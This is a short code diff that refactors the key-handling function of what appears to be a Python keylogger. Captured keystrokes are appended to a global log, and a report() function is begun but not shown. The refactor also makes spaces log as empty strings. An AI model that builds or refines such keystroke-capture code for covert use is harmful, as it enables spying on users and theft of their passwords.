@@ -10,18 +10,10 @@ def process_keys(key):
     try:
         log += str(key.char)
     except AttributeError:
-        if key == key.space:
-            log += " "
-        elif key == key.right:
+        if key in (key.space, key.right, key.left, key.up, key.down):
             log += ""
-        elif key == key.left:
-            log += ""
-        elif key == key.up:
-            log += ""
-        elif key == key.down:
-            log += ""       
         else:
-            log += " "+ str(key) + " "
+            log += " " + str(key) + " "
 
 def report():
     global log
